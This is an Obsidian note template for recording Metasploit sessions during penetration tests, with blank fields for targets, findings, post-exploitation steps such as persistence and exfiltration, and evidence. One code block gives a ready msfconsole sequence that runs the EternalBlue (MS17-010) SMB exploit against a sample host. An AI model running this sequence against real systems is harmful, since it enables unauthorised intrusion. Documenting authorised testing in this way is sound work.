---
title: "<% tp.file.title %>"
type: tool-note
tool: Metasploit
created: "<% tp.date.now('YYYY-MM-DD') %>"
tags: [tool, metasploit, exploit]
cssclass: cs-note
---

# <% tp.file.title %>

> [!meta]
> Campaign/Target:  • Date: <% tp.date.now('YYYY-MM-DD') %>

## Objective
Exploit validation, post-exploitation, or module testing.

## Target Info
- Host:  
- Ports:  
- Service/Version:  
- OS:  

## Modules / Commands
```text
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.5
set LHOST 10.0.0.10
run
```

## Output / Findings
Paste console output and results.

## Post-Exploitation Notes
- Privilege escalation:  
- Persistence:  
- Data exfiltration:  

## Artifacts / Evidence
`/Evidence/metasploit/` — files/screenshots/logs

## Next Steps
- 

## References
metasploit-framework docs, exploit-db

